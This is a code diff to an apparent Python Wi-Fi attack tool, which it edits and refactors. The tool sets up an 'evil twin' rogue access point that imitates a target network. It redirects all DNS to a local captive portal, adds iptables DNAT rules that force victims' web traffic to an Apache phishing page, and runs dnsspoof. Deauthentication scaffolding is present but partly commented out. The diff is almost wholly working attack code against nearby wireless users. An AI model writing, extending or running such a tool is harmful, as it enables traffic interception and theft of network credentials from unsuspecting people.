@@ -67,7 +67,7 @@ def create_file_in_tmp(file, content):
     print(f'{green(file)} created at {green(location)}')
 
 
-def dnsmasq(interface,internet_facing_interface=None, captive_portal=False):
+def dnsmasq(interface, internet_facing_interface=None, captive_portal=False):
     conf_content = [
         f'interface={interface}',
         f"log-queries",
@@ -89,7 +89,7 @@ def dnsmasq(interface,internet_facing_interface=None, captive_portal=False):
             "dhcp-option=6,192.168.10.1",  # DNS Server
             "listen-address=127.0.0.1,192.168.10.1",
             "server=8.8.8.8",  # Upstream DNS
-            f"except-interface={internet_facing_interface}"
+            f"except-interface={internet_facing_interface}",
             "address=/#/192.168.10.1"  # Redirect all domains to the captive portal IP
         ]
     create_file_in_tmp('dnsmasq.conf', conf_content)
@@ -115,6 +115,7 @@ def hostapd(interface, target_ap, channel, captive_portal=False, WPA2_PERSONAL=F
             f'macaddr_acl=0',
             f'auth_algs=1',
             f'ignore_broadcast_ssid=0',
+
         ]
 
     if WPA2_PERSONAL:
@@ -153,7 +154,7 @@ def rogue_ap(interface, internet_facing_interface, target_ap, channel, Called_fr
     forwarding(interface, internet_facing_interface)
     if captive_portal:
         hostapd(interface, target_ap, channel, captive_portal=True)
-        dnsmasq(interface, internet_facing_interface=internet_facing_interface,captive_portal=True)
+        dnsmasq(interface, internet_facing_interface=internet_facing_interface, captive_portal=True)
     else:
         dnsmasq(interface)
 
@@ -190,35 +191,29 @@ def create_new_interface(interface, channel):
     return monitor_interface
 
 
-def config_apache2_for_captive_portal():
-    config_content = [
-        '''
-        <VirtualHost *:80>
-	        ServerAdmin webmaster@localhost
-	        DocumentRoot /var/www/html
+def apache2(interface):
+    html_location = './captive_portal_html/{}'
+    html_destination = '/var/www/html/{}'
 
-	        ErrorLog ${APACHE_LOG_DIR}/error.log
-        	CustomLog ${APACHE_LOG_DIR}/access.log combined
-        	
-        	RedirectMatch 302 ^/$ /index.html
-        	
-        	RedirectMatch 302 ^/.*$ /index.html
+    config_location = './captive_portal_html/{}'
+    config_destination = '/etc/apache2/sites-enabled/{}'
 
 
-</VirtualHost>
+    # run_command_print_output(f"cp -r {html_location.format('temp')} {html_destination.format('temp')}")
+    # run_command_print_output(f"cp -r {html_location.format('android')} {html_destination.format('android')}")
+    # run_command(f"cp {config_location.format('android.config')} {config_destination.format('android.config')}")
 
-        '''
-    ]
+    # run_command(f"cp {config_location.format('000-default.conf')} /etc/apache2/sites-available/temp.conf")
+    run_command_print_output(f"cp {config_location.format('000-default.conf')} /etc/apache2/sites-available/000-default.conf")
 
-    run_command('systemctl start apache2')
+    # iptables rules
+    run_command_print_output(f'iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80')
+    # run_command(f'iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:443')
+    run_command_print_output(f'iptables -A FORWARD -p tcp -d 192.168.10.1 --dport 80 -j ACCEPT')
+    run_command_print_output(f'iptables -t nat -A POSTROUTING -j MASQUERADE')
 
-
-
-def send_webpage_to_apache2():
-    address_template = './captive_portal_html/{}/index.html'
-    destination = '/var/www/html/'
-    webpage = address_template.format('temp')
-    run_command_print_output(f'cp {webpage} {destination}')
+    run_command('a2enmode rewrite')
+    run_command('systemctl restart apache2')
 
 
 def evil_twin_deauth(interface, internet_facing_interface, target_ap):
@@ -230,11 +225,17 @@ def evil_twin_deauth(interface, internet_facing_interface, target_ap):
     :param target_ap:
     :return:
     """
+    # gather information on target
     bssid, channel = get_bssid_and_station_from_ap(interface, target_ap)
-    send_webpage_to_apache2()
+    # create a monitor interface from wlan0 to be used in aireplay
     monitor_interface = create_new_interface(interface, channel)
     # aireplay(monitor_interface,bssid,channel)
+    # start web server
+    apache2(interface)
+    # create access point
     rogue_ap(interface, internet_facing_interface, target_ap, channel, Called_from_EvilTwin=True, captive_portal=True)
+    # redirect all traffic to interface
+    run_command(f'dnsspoof -i {interface}')
     input('Press Enter to Quit Evil Twin')
     close(interface, internet_facing_interface, monitor_interface)
 
